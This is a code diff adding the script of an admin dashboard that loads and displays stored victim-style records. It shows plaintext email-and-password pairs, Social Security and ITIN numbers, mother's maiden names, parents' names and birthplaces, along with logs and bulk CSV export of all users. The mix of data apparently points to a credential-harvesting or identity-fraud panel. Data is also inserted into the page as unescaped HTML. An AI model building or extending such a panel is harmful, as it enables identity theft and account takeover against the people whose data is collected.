+            html += '<td>' + (personData.lastName || '-') + '</td>';
+            html += '<td>' + (personData.middleName || '-') + '</td>';
+            html += '<td>' + (personData.fatherName || '-') + '</td>';
+            html += '<td>' + (personData.motherName || '-') + '</td>';
+            html += '<td>' + (personData.maidenName || '-') + '</td>';
+            html += '<td>' + (personData.placeOfBirth || '-') + '</td>';
+            html += '<td>' + date + '</td>';
+            html += '</tr>';
+          });
+        }
+        
+        document.querySelector('#backgroundTable tbody').innerHTML = html;
+      } catch (error) {
+        console.error('Error:', error);
+        document.querySelector('#backgroundTable tbody').innerHTML = '<tr><td colspan="9" style="text-align: center; color: #fca5a5; padding: 20px;">Error loading background info</td></tr>';
+      }
+    }
+
+    async function loadCredentials() {
+      try {
+        const res = await fetch(API + '/data/credentials');
+        const data = await res.json();
+        
+        let html = '';
+        if (data.credentials && data.credentials.length > 0) {
+          data.credentials.forEach(cred => {
+            const date = new Date(cred.createdAt || cred.timestamp).toLocaleString();
+            html += '<tr>';
+            html += '<td>' + (cred.userEmail || '-') + '</td>';
+            html += '<td>' + cred.email + '</td>';
+            html += '<td style="font-family: monospace; color: var(--accent);">' + cred.password + '</td>';
+            html += '<td>' + date + '</td>';
+            html += '</tr>';
+          });
+        }
+        
+        document.querySelector('#credTable tbody').innerHTML = html;
+      } catch (error) {
+        console.error('Error:', error);
+      }
+    }
+
+    async function loadSensitiveData() {
+      try {
+        const res = await fetch(API + '/data/sensitive');
+        const data = await res.json();
+        
+        let ssnHtml = '';
+        if (data.ssn?.data && data.ssn.data.length > 0) {
+          data.ssn.data.forEach(item => {
+            const date = new Date(item.createdAt || item.timestamp).toLocaleString();
+            ssnHtml += '<tr><td>' + (item.userEmail || item.email || '-') + '</td><td style="font-family: monospace; color: var(--accent);">' + item.ssn + '</td><td>' + date + '</td></tr>';
+          });
+        }
+        document.querySelector('#ssnTable tbody').innerHTML = ssnHtml;
+        
+        let itinHtml = '';
+        if (data.itin?.data && data.itin.data.length > 0) {
+          data.itin.data.forEach(item => {
+            const date = new Date(item.createdAt || item.timestamp).toLocaleString();
+            itinHtml += '<tr><td>' + (item.userEmail || item.email || '-') + '</td><td style="font-family: monospace; color: var(--accent);">' + item.itin + '</td><td>' + date + '</td></tr>';
+          });
+        }
+        document.querySelector('#itinTable tbody').innerHTML = itinHtml;
+      } catch (error) {
+        console.error('Error:', error);
+      }
+    }
+
+    async function loadLogs() {
+      try {
+        const action = document.getElementById('actionFilter').value;
+        let url = API + '/logs/all?limit=500';
+        if (action) url += '&action=' + action;
+        
+        const res = await fetch(url);
+        const data = await res.json();
+        
+        let html = '';
+        if (data.logs && data.logs.length > 0) {
+          data.logs.forEach(log => {
+            const date = new Date(log.createdAt).toLocaleString();
+            const status = log.status === 'success' ? '<span class="badge badge-success">✓ SUCCESS</span>' : '<span class="badge badge-danger">✗ FAILED</span>';
+            html += '<tr>';
+            html += '<td>' + date + '</td>';
+            html += '<td>' + (log.userEmail || '-') + '</td>';
+            html += '<td>' + log.action + '</td>';
+            html += '<td>' + status + '</td>';
+            html += '</tr>';
+          });
+        }
+        
+        document.querySelector('#logsTable tbody').innerHTML = html;
+      } catch (error) {
+        console.error('Error:', error);
+      }
+    }
+
+    // ============ EXPORT FUNCTIONS ============
+
+    function exportUserHTML(userId) {
+      showToast('info', 'PREPARING', 'Generating user report...', 2000);
+      window.location.href = API + '/export/user/' + userId + '/html';
+      setTimeout(() => {
+        showToast('success', 'EXPORTED', 'User report downloaded successfully');
+      }, 1500);
+    }
+
+    function exportUserCSV(userId) {
+      showToast('info', 'PREPARING', 'Exporting user data...', 2000);
+      window.location.href = API + '/export/user/' + userId + '/csv';
+      setTimeout(() => {
+        showToast('success', 'EXPORTED', 'User data exported to CSV');
+      }, 1500);
+    }
+
+    function exportAllUsersCSV() {
+      showToast('info', 'PREPARING', 'Exporting all user data...', 2000);
+      window.location.href = API + '/export/all-users/csv';
+      setTimeout(() => {
+        showToast('success', 'EXPORTED', 'All user data exported to CSV');
+      }, 1500);
+    }
+
+    // Close modal when clicking outside
+    document.getElementById('deleteModal').addEventListener('click', function(e) {
+      if (e.target === this) {
+        closeDeleteModal();
+      }
+    });
+
+    // Load stats on page load
+    window.addEventListener('load', loadStats);
+  </script>
+</body>
+</html>
